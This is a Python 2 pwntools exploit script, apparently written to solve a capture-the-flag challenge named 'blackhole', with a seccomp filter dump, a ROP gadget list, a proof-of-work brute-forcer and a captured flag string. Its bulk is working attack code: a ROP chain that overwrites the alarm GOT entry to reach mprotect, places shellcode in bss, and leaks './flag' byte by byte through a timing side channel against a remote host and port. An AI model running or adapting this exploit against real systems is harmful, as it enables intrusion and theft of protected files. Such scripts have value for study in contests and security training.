from pwn import *
import random, string, subprocess, os, sys
from hashlib import sha256
import time
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x0b 0x00 0x40000000  if (A >= 0x40000000) goto 0015
#  0004: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0014
#  0005: 0x15 0x08 0x00 0x00000003  if (A == close) goto 0014
#  0006: 0x15 0x07 0x00 0x0000000a  if (A == mprotect) goto 0014
#  0007: 0x15 0x06 0x00 0x0000003c  if (A == exit) goto 0014
#  0008: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0014
#  0009: 0x15 0x00 0x05 0x00000002  if (A != open) goto 0015
#  0010: 0x20 0x00 0x00 0x0000001c  A = args[1] >> 32
#  0011: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0015
#  0012: 0x20 0x00 0x00 0x00000018  A = args[1]
#  0013: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0015
#  0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0015: 0x06 0x00 0x00 0x00000000  return KILL



#flag{even_black_holes_leak_information_by_Hawking_radiation}
#0x0000000000400a4c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#0x0000000000400a4e : pop r13 ; pop r14 ; pop r15 ; ret
#0x0000000000400a50 : pop r14 ; pop r15 ; ret
#0x0000000000400a52 : pop r15 ; ret
#0x0000000000400822 : pop rbp ; mov byte ptr [rip + 0x20083e], 1 ; ret
#0x00000000004007af : pop rbp ; mov edi, 0x601068 ; jmp rax
#0x0000000000400a4b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#0x0000000000400a4f : pop rbp ; pop r14 ; pop r15 ; ret
#0x00000000004007c0 : pop rbp ; ret
#0x0000000000400a53 : pop rdi ; ret
#0x0000000000400a51 : pop rsi ; pop r15 ; ret
#0x0000000000400a4d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
#0x000000000040084a : push rbp ; mov rbp, rsp ; call rax
read_got=0x000000000601048
read_plt=0x400730
bss_start=0x00601000
bss_end=0x00602000         
offset=40
pop_rdi_ret=0x0000000000400a53
pop_rsi_r15=0x0000000000400a51
pop_r12_r13_r14_r15=0x0000000000400a4c
pop_rbx_rbp_r12_r13_r14_r15=0x000000000400A4A
call_rsp=0x0000000000400a9b
jmp_rax=0x0000000004007b5 
mov_call=0x0000000000400A30
exit=0x000000000601020
alram=0x601040
alram_plt=0x400720
main=0x00000000004009a7
#call read and write to somewhere for test
#first read
context.arch='amd64'

flag=""
def ans(chal):
    gg = ''.join(chr(i) for i in range(256))
    while True:
        sol = ''.join(random.choice(gg) for _ in xrange(4))
        if sha256(chal + sol).hexdigest().startswith('00000'):
            return sol


def ans1(chal):
    flag=1
    itr=0
    while True:
        sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
        itr+=1
        if sha256(chal + sol).hexdigest().startswith('00000'):
            print "done with :" +str(itr)
            return sol
def exploit(i,byte):
    sc = asm(shellcraft.open("./flag"))
    sc += asm('''
        xor r14, r14
        xor r15, r15
        mov r15, rsp
        sub r15, 0x800
                ''')
    sc += asm(shellcraft.read("rax", "r15", 200))
    sc += asm('''
        xor rsi, rsi
        xor rdi, rdi
        mov sil, byte ptr [r15+'''+str(i)+''']
        mov dil, ''' + hex(byte) + '''
        cmp sil, dil
        je correct
        jmp wrong
        correct:
        jmp correct
        wrong:
        xor rax,rax
        add al, 0x3c
        syscall''')

#    r=process("./blackhole")
#    pause()
#    log.info("bruteforcing to corrupt alram to mprotect")
    payload="A"*40
    payload+=p64(pop_rbx_rbp_r12_r13_r14_r15)
    payload+=p64(0)+p64(1)#rbx rbp
    payload+=p64(read_got)#r12== function to be called
    payload+=p64(10)#r13 ==rdx
    payload+=p64(alram-9)#r14==rsi
    payload+=p64(0)#r15== edi
    payload+=p64(mov_call)

        #mprotect the region
    payload+=p64(pop_rbx_rbp_r12_r13_r14_r15)# it doesnt execute though
    payload+=p64(0)+p64(1) #rbx rbp
    payload+=p64(alram)#r12
    payload+=p64(7)#r13==rdx
    payload+=p64(0x1000)#r14==rsi
    payload+=p64(bss_start)# rdi== edi
    payload+=p64(mov_call)

        #just make the region clean and return back to main
    payload+=p64(0)
    payload+=p64(0)+p64(1)#rbx rbp
    payload+=p64(read_got)#r12== function to be called
    payload+=p64(20)#r13 ==rdx
    payload+=p64(bss_start+0x100)#r14==rsi
    payload+=p64(0)#r15== edi
        #payload+=p64(mov_call)
    payload+=p64(main)
    print len(payload)
        
#    r.send(payload)
    sleep(0.1)

 #   r.send("A"*9+"\x05")
    #after read in 10 character
    #the eax will become the number of character entered
    #r.send("A"*9+"\x85")
    sleep(0.1)
 #   log.info("Second level shellcode")
 #   log.info("Now write the shellcode to the bss :)")
    payload2 ="B"*40
    payload2+=p64(pop_rbx_rbp_r12_r13_r14_r15)
    payload2+=p64(0)+p64(1)#rbx rbp
    payload2+=p64(read_got)#r12== function to be called
    payload2+=p64(len(sc))#r13 ==rdx
    payload2+=p64(bss_start+0x100)#r14==rsi
    payload2+=p64(0)#r15== edi
    payload2+=p64(mov_call)
    payload2+=p64(0)*6
    payload2+=p64(call_rsp)
    payload2+=p64(bss_start+0x100)


  #  r.send(payload2)
    sleep(0.1)
 #   r.send(sc)
    sleep(0.1)
    sd=payload.ljust(0x100,"\x90")+"A"*9+"\x85"+payload2.ljust(0x100,"\x90")+sc
    print len(sd)
    sd=sd.ljust(0x800,"\x00")
    with open('payload.txt',"w") as f:
        f.write(sd)
        f.close()

    t = time.time()
    r.sendline(sd)
    

    try:
        r.recv()

    except EOFError:
        pass
    dt = time.time() - t
    if dt>2:
        print "correct : "
        exit(-1) 
        
    r.close()
for i in range(2,100):

    for byte in range(32,127):
        print chr(byte)
#        host="localhost"
#        port=1699
        host="202.120.7.203"
        port=666

        r=remote(host,port)
        chal=r.recvuntil("\n")
        ret=ans1(chal[:-1])
#        print ret
        r.send(str(ret))
#        sleep(2)
        exploit(i,byte)
